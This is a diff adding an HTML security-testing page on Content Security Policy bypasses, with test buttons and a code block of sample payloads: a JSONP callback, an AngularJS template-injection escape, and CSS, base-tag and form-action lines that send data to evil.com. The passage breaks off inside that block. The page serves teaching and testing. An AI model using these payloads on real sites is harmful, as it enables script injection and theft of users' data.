@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSP Bypass Attempts - Security Testing</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+        .container { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .header { background: #f44336; color: white; padding: 20px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px; }
+        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 4px; margin-bottom: 20px; color: #856404; }
+        .form-section { background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 20px 0; }
+        .btn { padding: 10px 20px; background: #f44336; color: white; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
+        .result-area { background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 4px; margin: 20px 0; }
+        .code-example { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 4px; margin: 10px 0; overflow-x: auto; font-family: 'Courier New', monospace; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚨 CSP Bypass Attempts</h1>
+            <p>Testing Content Security Policy bypass techniques</p>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This page demonstrates CSP bypass attempts for educational purposes only.
+            <br>These techniques are used to test and improve CSP implementations.
+        </div>
+
+        <div class="form-section">
+            <h3>🔓 JSONP Bypass Attempt</h3>
+            <p>Attempting to bypass CSP using JSONP callbacks:</p>
+            <button onclick="testJSONPBypass()" class="btn">Test JSONP Bypass</button>
+            <div id="jsonpResults" class="result-area" style="display: none;"></div>
+        </div>
+
+        <div class="form-section">
+            <h3>🔓 Angular Template Injection</h3>
+            <p>Testing AngularJS template injection bypass:</p>
+            <button onclick="testAngularBypass()" class="btn">Test Angular Bypass</button>
+            <div id="angularResults" class="result-area" style="display: none;"></div>
+        </div>
+
+        <div class="form-section">
+            <h3>🔓 CSS Data Exfiltration</h3>
+            <p>Attempting CSS-based data exfiltration:</p>
+            <button onclick="testCSSBypass()" class="btn">Test CSS Bypass</button>
+            <div id="cssResults" class="result-area" style="display: none;"></div>
+        </div>
+
+        <div class="code-example">
+// 🚨 CSP Bypass Techniques (Educational Only)
+
+// JSONP Bypass
+&lt;script src="https://api.example.com/jsonp?callback=alert"&gt;&lt;/script&gt;
+
+// Angular Template Injection
+{{constructor.constructor('alert(1)')()}}
+
+// CSS Data Exfiltration
+input[value^="a"] { background: url(https://evil.com/steal?data=a); }
+
+// Base Tag Injection
+&lt;base href="https://evil.com/"&gt;
+
+// Form Action Hijacking
+&lt;form action="https://evil.com/steal"&gt; 
